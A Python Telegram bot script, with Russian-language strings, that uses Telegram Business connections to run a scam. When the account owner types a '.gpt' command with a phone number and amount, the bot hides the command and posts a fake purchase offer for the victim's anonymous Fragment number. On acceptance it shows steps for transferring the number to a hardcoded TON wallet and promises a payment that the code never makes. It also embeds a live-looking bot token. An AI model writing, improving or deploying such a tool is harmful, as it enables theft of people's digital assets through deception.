import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, LinkPreviewOptions
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# --- НАСТРОЙКИ ---
BOT_TOKEN = "9069731124:AAEV25xD2-KJ4aEce5MTBS6Z1VcV9wga41o"
TON_WALLET = "UQCiU6HfycyDIneKsw-UAYakjfr4W99W558nbJKaaRPeSh6b"

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dispatcher = Dispatcher()

# ID премиум-эмодзи
CHECK_EMOJI_ID = "5774022692642492953"
CROSS_EMOJI_ID = "5778527486270770928"
ENVELOPE_EMOJI_ID = "6019263620142078168"

async def safe_delete(chat_id, message_id, conn_id=None):
    if conn_id:
        try:
            await bot.delete_business_messages(business_connection_id=conn_id, message_ids=[message_id])
            return
        except Exception:
            pass
    try:
        await bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        pass

@dispatcher.business_message(F.text.startswith(".gpt"))
async def send_offer(message: Message):
    if not message.business_connection_id:
        return

    try:
        connection = await bot.get_business_connection(message.business_connection_id)
        owner_id = connection.user.id
    except Exception:
        return

    if message.from_user.id != owner_id:
        return

    parts = message.text.split()
    if len(parts) < 3:
        return

    phone_number = None
    for p in parts[1:]:
        if p.startswith("+"):
            phone_number = p
            break
    
    if not phone_number:
        return

    try:
        amount = parts[2] if not parts[2].startswith("+") else parts[3]
        if len(amount) > 6:
            await bot.send_message(message.chat.id, "❌ Ошибка формата. Вводите так: <code>.gpt +88803674195 150</code>", parse_mode="HTML")
            return
    except IndexError:
        return

    amount_text = f"{amount} TON"

    phone_clean = phone_number.replace("+", "")
    if len(phone_clean) >= 10:
        formatted_phone = f"+{phone_clean[:3]} {phone_clean[3:7]} {phone_clean[7:]}"
    else:
        formatted_phone = phone_number

    fragment_link = f"https://fragment.com/number/{phone_clean}"

    offer_text = (
        f"<b>Buy {formatted_phone}</b>\n\n"
        f"Поступило предложение о выкупе вашего анонимного номера.\n\n"
        f"Сумма: <b>{amount_text}</b>\n"
        f"Срок действия: <b>5ч 59м</b>\n\n"
        f"<i>Нажмите «Принять» для перевода номера на кошелек покупателя.</i>"
    )

    # ДОБАВЛЕНА КНОПКА ОТКЛОНИТЬ
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Отклонить", callback_data="decline_offer", icon_custom_emoji_id=CROSS_EMOJI_ID),
        InlineKeyboardButton(text="Принять", callback_data="accept_offer", icon_custom_emoji_id=CHECK_EMOJI_ID)
    ]])

    await safe_delete(message.chat.id, message.message_id, message.business_connection_id)

    try:
        await bot.send_message(
            chat_id=message.chat.id,
            text=offer_text,
            reply_markup=keyboard,
            business_connection_id=message.business_connection_id,
            link_preview_options=LinkPreviewOptions(
                url=fragment_link,
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True
            )
        )
    except Exception as e:
        print(f"Ошибка отправки: {e}")

@dispatcher.callback_query(F.data == "accept_offer")
async def on_accept_offer(callback: CallbackQuery):
    conn_id = callback.message.business_connection_id

    new_text = (
        f"<b>Ожидание перевода</b>\n\n"
        f"Переведите номер на кошелек:\n"
        f"<code>{TON_WALLET}</code>\n\n"
        f"1. Откройте Fragment.com\n"
        f"2. Перейдите в «Мой номер»\n"
        f"3. Нажмите Transfer\n"
        f"4. Вставьте адрес кошелька\n"
        f"5. Подтвердите передачу\n\n"
        f"<i>После перевода средства будут зачислены на ваш баланс.</i>"
    )

    new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Открыть Fragment", url="https://fragment.com", icon_custom_emoji_id=ENVELOPE_EMOJI_ID)],
        [InlineKeyboardButton(text="Скопировать кошелек", callback_data="copy_wallet")]
    ])

    try:
        await callback.message.edit_text(new_text, reply_markup=new_keyboard)
    except Exception as e:
        print(f"Ошибка: {e}")
        
    await callback.answer()

# --- ОБРАБОТЧИК ОТКЛОНЕНИЯ ---
@dispatcher.callback_query(F.data == "decline_offer")
async def on_decline(callback: CallbackQuery):
    try:
        await callback.message.delete()
    except Exception as e:
        print(f"Ошибка удаления: {e}")
    await callback.answer("Вы отклонили предложение.", show_alert=True)

@dispatcher.callback_query(F.data == "copy_wallet")
async def on_copy_wallet(callback: CallbackQuery):
    await callback.answer(f"Кошелек скопирован: {TON_WALLET}", show_alert=True)

async def main():
    print("Бот запущен.")
    await dispatcher.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
